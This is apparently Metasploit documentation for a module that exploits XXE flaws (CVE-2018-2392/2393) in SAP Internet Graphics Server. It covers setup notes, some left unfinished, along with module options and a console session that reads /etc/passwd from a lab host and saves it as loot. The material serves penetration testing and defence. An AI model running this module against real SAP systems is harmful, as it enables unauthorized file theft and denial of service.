## Vulnerable Application
This module exploits two vulnerabilities, CVE-2018-2392 and CVE-2018-2393, within version 7.20, 7.20EXT, 7.45, 7.49,
and 7.53 of SAP Internet Graphics Server (IGS). Both of these vulnerabilities occur due a lack of validation on XML
External Entities when XML files are uploaded via the /XMLCHART page. Unauthenticated remote attackers can exploit
this vulnerability to either read files from the server's file system as the XXX user, or conduct a denial of service
attack against the vulnerable SAP IGS server.

### Application Background
The Internet Graphics Service (IGS) provides infrastructure to enable developers to display graphics
in an internet browser with minimal effort. It has been integrated in several different SAP UI technologies
where is provides a say for data from another SAP system or data source to be utilized to generate
dynamic graphical or non-graphical output.

### Install steps
1. Register for an account at https://accounts.sap.com/ui/public/showRegisterForm?spName=profile.people.sap.com&targetUrl=&sourceUrl=
2. Click on the link in the email that will be sent to activate your account.
3. Browse to http://service.sap.com/swdc. Accept the legal reguirements.
4. XXXX ??? At this point I couldn't download any software as none of the download pages are accessible.
   I think you need a paid subscription to access them.

XXX - Need to add setup instruction here....
SAP IGS versions: 7.20, 7.20EXT, 7.45, 7.49, 7.53 are affected by this vulnerability.
Installing and Updating the IGS [instructions][2].
Configuring the IGS [instructions][3].
Administering the IGS [instructions][4].

Once set up and configured, the instances will be vulnerable on the default HTTP port 40080.

## Verification Steps

  1. Start msfconsole
  1. Do: `workspace [WORKSPACE]`
  1. Do: `use auxiliary/admin/sap/sap_igs_xmlchart_xxe`
  1. Do: `set RHOSTS [IP]`
  1. Do: `set FILE [remote file name]`
  1. Do: `set SHOW [true|false]`
  1. Do: `set action READ`
  1. Do: `check`
  1. Do: `run`
  1. Verify that the contents of the file you specified were returned.

## Options

### FILE

File to read from the remote server. Example: `/etc/passwd`

### URN

This is the URL of the XMLCHART page on the SAP IGS server that is vulnerable to XXE.
By default it is set to `/XMLCHART`, however it can be changed if the SAP IGS server
was installed under a different path than the web root. For example if the SAP IGS
server was installed to the `/igs/` path under the web root, then this value would be
set to `/igs/XMLCHART`.

## Actions
```
   Name  Description
   ----  -----------
   READ  Remote file read
   DOS   Denial Of Service
```

## Scenarios

### Vulnerable SAP IGS release: 7.45 running on SUSE Linux Enterprise Server for SAP Applications 12 SP1

```
msf6 > workspace -a SAP_TEST
[*] Added workspace: SAP_TEST
[*] Workspace: SAP_TEST
msf6 > use auxiliary/admin/sap/sap_igs_xmlchart_xxe
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set RHOSTS 10.10.10.10
RHOSTS => 10.10.10.10
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set FILE /etc/passwd
FILE => /etc/passwd
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set action READ
action => READ
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set Proxies http:127.0.0.1:8080
Proxies => http:127.0.0.1:8080
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > options

Module options (auxiliary/admin/sap/sap_igs_xmlchart_xxe):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FILE     /etc/passwd          yes       File to read from the remote server
   Proxies  http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.10          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    40080                yes       The target port (TCP)
   SHOW     true                 no        Show remote file content
   SSL      false                no        Negotiate SSL/TLS for outgoing connections
   URN      /XMLCHART            no        SAP IGS XMLCHART URN
   VHOST                         no        HTTP server virtual host


Auxiliary action:

   Name  Description
   ----  -----------
   READ  Remote file read


msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > check
[+] 10.10.10.10:40080 - The target is vulnerable. OS info: SUSE Linux Enterprise Server for SAP Applications 12 SP1
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > run
[*] Running module against 10.10.10.10

[+] File: /etc/passwd content from host: 10.10.10.10
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/bin/bash
daemon:x:2:2:Daemon:/sbin:/bin/bash
lp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bash
mail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/false
news:x:9:13:News system:/etc/news:/bin/bash
uucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bash
games:x:12:100:Games account:/var/games:/bin/bash
man:x:13:62:Manual pages viewer:/var/cache/man:/bin/bash
wwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/false
ftp:x:40:49:FTP account:/srv/ftp:/bin/bash
nobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bash
messagebus:x:499:499:User for D-Bus:/var/run/dbus:/bin/false
sshd:x:498:498:SSH daemon:/var/lib/sshd:/bin/false
polkitd:x:497:496:User for polkitd:/var/lib/polkit:/sbin/nologin
nscd:x:496:495:User for nscd:/run/nscd:/sbin/nologin
rpc:x:495:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
openslp:x:494:2:openslp daemon:/var/lib/empty:/sbin/nologin
uuidd:x:493:492:User for uuidd:/var/run/uuidd:/bin/bash
usbmux:x:492:65534:usbmuxd daemon:/var/lib/usbmuxd:/sbin/nologin
ntp:x:74:491:NTP daemon:/var/lib/ntp:/bin/false
at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
vnc:x:491:490:user for VNC:/var/lib/empty:/sbin/nologin
rtkit:x:490:489:RealtimeKit:/proc:/bin/false
pulse:x:489:488:PulseAudio daemon:/var/lib/pulseaudio:/sbin/nologin
statd:x:488:65534:NFS statd daemon:/var/lib/nfs:/sbin/nologin
ftpsecure:x:487:65534:Secure FTP User:/var/lib/empty:/bin/false
postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/false
scard:x:486:485:Smart Card Reader:/var/run/pcscd:/usr/sbin/nologin
gdm:x:485:483:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
erpadm:x:1001:1001:SAP System Administrator:/home/erpadm:/bin/csh
sapadm:x:1002:1001:SAP System Administrator:/home/sapadm:/bin/false

[+] File: /etc/passwd saved in: /Users/vladimir/.msf4/loot/20200929135102_SAP_TEST_10.10.10.10_sap.igs.xxe_302025.txt
[*] Auxiliary module execution completed
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > services
Services
========

host         port   proto  name  state  info
----         ----   -----  ----  -----  ----
10.10.10.10  40080  tcp    http  open   SAP Internet Graphics Server (IGS); OS info: SUSE Linux Enterprise Server for SAP Applications 12 SP1

msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > vulns

Vulnerabilities
===============

Timestamp                Host         Name                                    References
---------                ----         ----                                    ----------
2020-09-29 10:51:01 UTC  10.10.10.10  SAP Internet Graphics Server (IGS) XXE  CVE-2018-2392,CVE-2018-2393,URL-https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf

msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > loot

Loot
====

host         service  type         name         content     info         path
----         -------  ----         ----         -------     ----         ----
10.10.10.10           sap.igs.xxe  /etc/passwd  text/plain  SAP IGS XXE  /Users/vladimir/.msf4/loot/20200929135102_SAP_TEST_10.10.10.10_sap.igs.xxe_302025.txt

```

[1]: https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf
[2]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e193dbeb5c617e2e10000000a42189b.html
[3]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e1939c9b5c617e2e10000000a42189b.html
[4]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e193988b5c617e2e10000000a42189b.html
